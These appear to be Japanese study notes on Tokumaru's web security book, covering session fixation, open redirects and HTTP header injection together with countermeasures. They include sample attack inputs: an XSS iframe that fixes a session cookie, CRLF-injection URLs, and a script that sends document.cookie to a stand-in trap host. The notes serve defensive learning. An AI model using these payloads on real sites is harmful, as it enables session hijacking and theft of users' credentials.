# 徳丸本
- ## 4章 Webアプリケーションの機能別に見るセキュリティバグ(続き)
- ### 4.6 セッション管理の不備(続き)
- #### 4.6.3 URL埋め込みのセッションID
	- セッションIDをCookieではなく、URLに埋め込むようにしていると、RefererヘッダからセッションIDが漏洩する可能性がある
	- ただし、セッションIDが漏洩するためには、以下の2つの条件が必要である
		- サイト内に外部サイトへのリンク(=悪意を持ったサイトへのリンク)を作成出来る
		- Referrer-Policyをunsafe-urlなどにしている
			- [参考](https://developer.mozilla.org/ja/docs/Web/HTTP/Headers/Referrer-Policy)
			- Referrer-Policyを使うことで、Refererの送信を制限することが出来る(Referrer-PolicyのスペルはRefererではなく、Referrer)
			- レスポンス中のHTTPヘッダで制限する方法とHTMLで制限する方法がある
			- unsafe-urlは常にオリジン、パス、クエリパラメータをRefererとして送信する
			- デフォルトはstrict-origin-when-cross-originで、この場合、同一オリジンへのリクエストでしかクエリパラメータを送信しない
- #### 4.6.4 セッションIDの固定化(session fixation)
	- 攻撃者が用意したセッションIDを利用者に使わせる
	- 利用者が個人情報を入力すると、攻撃者がそれを見ることが出来る
	- セッションIDをURLに埋め込んでいるサイトの場合、攻撃が簡単
		- 利用者がURLを注意深く見ていたら失敗するが
		- 攻撃者がセッションID付きのURLを利用者に送信して、新規登録させる
			- セッションIDは攻撃者が用意する
		- 利用者が新規登録して、セッションIDに個人情報が紐づく
			- 新規登録が完了する前でも、入力画面と確認画面があった時、確認画面から入力画面に戻った時に入力値を復元するためにセッション変数を使っていると、session fixationが可能
		- セッションアダプションが有効なサイトの場合、攻撃者は適当なセッションIDを作れば良い(ABCとか何でも良い)
			- セッションアダプションとは、未知のセッションIDを受け入れるというもので、利用者が勝手に作ったセッションIDに情報を紐づける
				- PHPやASP.NETなどでセッションアダプションが有効になっている
			- セッションアダプションが有効でない場合、サーバが生成したセッションIDにしか情報を紐付けない
		- セッションアダプションが有効でないサイトの場合、攻撃者がサイトを閲覧して、有効なセッションIDを発行して、これを利用者に使わせる
			- といっても、[この記事](https://www.ubsecure.jp/blog/session_fixation)の図のように、サイトにアクセスしたタイミングでセッションIDが発行されるようになっていないと攻撃は成立しない
			- 新規登録してからセッションIDが発行される仕組みなら、既にそのセッションIDに攻撃者の情報が紐づいてしまうので、そのセッションIDを使った利用者はおかしいと思うはずなので
	- セッションIDをCookieで管理しているサイトの場合はXSSやHTTPヘッダインジェクションを利用する
		- XSSの場合は以下のようなiframeを埋め込む
			- ```html
			  <iframe width=320 height=100 src="http://example.jp?keyword=<script>
			  document.cookie='PHPSESSID=ABC'
			  </script>"></iframe>
			  ```
			- iframeは隠しておいて、サイト(http://example.jp)へのログインを促す
	- 対策
		- リクエスト中に含まれるセッションIDに情報を紐づけるのではなく、サーバ側で新たにセッションIDを生成し、これに情報を紐付け、このセッションIDをCookieにセットする(前のセッションIDは削除する)
		- トークンを利用する方法
		  id:: 64e19f0d-9e36-4788-8940-87cf0bc35d12
			- ↑が出来ない時(そんな時ある？)に使う
			- 新規登録したタイミングで、セッションIDに情報を紐付けるだけでなく、サーバでトークンを生成し、このトークンをセッション変数とCookieにセットする
			- 認証後のページはトークンを検証する
			- 攻撃者はトークンを知らないため、利用者の個人情報を見ることが出来ない
- ### 4.7 リダイレクト処理にまつわる脆弱性
- #### 4.7.1 オープンリダイレクト
	- リダイレクトはLocationヘッダを使う方法と、JavaScriptを使う方法(location.href="...")がある
	- リダイレクト先を外部から指定できるようになっている(クエリパラメータなどで)と、個人情報を盗まれる可能性がある
		- リダイレクト先がオープンであるという意味で、オープンリダイレクト
	- 攻撃例
		- ログイン画面 → ログイン完了画面というページ遷移を考える
		- 普通なら、ログイン画面のformタグのactionでログイン完了画面を指定することでページ遷移を行うが、actionで指定した処理がLocationヘッダを返すことで、ログイン完了画面へのページ遷移を行う場合を考える
		- ログイン画面はクエリパラメータで遷移先のURLを受け取る
		- このURLをformタグで送信し、actionで指定した処理がLocationヘッダの値にセットする
		- 攻撃者はクエリパラメータのURLに罠サイトを指定して、これを利用者が閲覧するように仕向ける(`http://example.jp/login?url=http://trap.example.com`など）
		- 利用者がログイン画面でログインボタンを押すと、罠サイトに遷移する
		- 罠サイトは正規サイトのログイン失敗画面に似せて作る
		- 利用者はパスワードを間違えたと思って、再度IDとパスワードを入力してログインボタンを押す
		- この時に攻撃者のサーバにIDとパスワードが送られるようにする
		- さらに、正規サイトのログイン画面に遷移するようにしておけば、利用者は今度はログインが成功したと思い、気づかれにくくなる
	- 対策
		- リダイレクト先のURLを固定し、外部から指定出来ないようにする
		- やむを得ず、リダイレクト先を可変にしたい場合は、リダイレクト先のURLを直接指定せず番号指定にする
			- ページ番号のURLの対応表は外部から見えないファイルやデータベースで管理する
		- 番号指定にしたくない時は、リダイレクト先のドメイン名を検証する
			- 検証漏れが多いので注意
			- 例えば、URLが`http://example.jp/`から始まっていたらOKとすると、HTTPヘッダインジェクションで回避される
	- 外部ドメインにリダイレクトする場合は、クッションページを用意すると、被害を抑えられる
		- クッションページがないと、正規サイトに似せて作った罠サイトが作られていると、リダイレクトしても、まだ正規サイト内にいると思ってしまうため
- #### 4.7.2 HTTPヘッダ・インジェクション
	- 外部からのパラメータを元にHTTPヘッダとして出力していると、HTTPヘッダ・インジェクションが発生する
	- 外部ドメインへのリダイレクト、任意のCookie生成、偽画面の表示といった攻撃が可能
	- 外部ドメインへのリダイレクト
		- オープンリダイレクトで説明した、遷移先のURLをクエリパラメータで受け取るログイン画面(`http://example.jp/login?url=...`)を考える
		- URLの検証を行なっていて、`http://example.jp/`で始まっていない場合はエラーとする
		- しかし、`http://example.jp/login?url=http://example.jp/%0D%0ALocation:+http://trap.example.com`にアクセスすると、検証をクリアし、http://trap.example.comにリダイレクトしてしまう
		- `%0D%0A`はCRLFを意味していて、これによってプログラムは2行のLocationヘッダを出力する
			- ```
			  Location: http://example.jp/
			  Location: http://trap.example.com
			  ```
		- Apacheはプログラムから複数のLocationヘッダを受け取った時、最後のLocationヘッダのみをレスポンスとして返す
	- 任意のCookie生成
		- `http://example.jp/login?url=http://example.jp/%0D%0ASet-Cookie:+PHPSESSID=ABC`にアクセスすると、Cookieがセットされる
		- session fixationに利用する
	- 偽画面の表示
		- `%0D%0A`を2回連続させることで、その後の文字列がレスポンスボディと見做される
		- 正規サイトのコンテンツも一緒に表示されてしまうが、CSSで隠すことが出来る
		- 偽のフォームを作成して個人情報を盗むことが出来る
			- ドメインは正規のものであるため信用してしまう可能性がある
		- JavaScriptを実行してCookieを盗んだり出来る
			- `?url=http://example.jp/%0D%0A%0D%0A<script>fetch('http://trap.example.com?sid='%2Bdocument.cookie)</script>`など
	- 対策
		- 外部からのペラメータをレスポンスヘッダとして出力しない
		- LocationヘッダやSet-Cookieヘッダの出力を専用APIに任せる
			- Ginの場合、ctx.Redirectやctx.SetCookieなど
			- 中身の処理がどうなっているのか後で調べる
	- HTTPヘッダ・インジェクションに関連して、HTTPレスポンス分割攻撃というのがある([参考](http://www.techmatrix.co.jp/product/jtest/security/httpresponsesplitting.html))
		- HTTP/1.1では複数のリクエストをまとめて送信することが出来て、この場合レスポンスもまとめて返される
		- 1つ目のリクエストでHTTPヘッダ・インジェクションをして、偽のコンテンツを2つ目のリクエストに対するレスポンスとして誤認させ、キャッシュサーバに偽コンテンツをキャッシュさせる(キャッシュ汚染)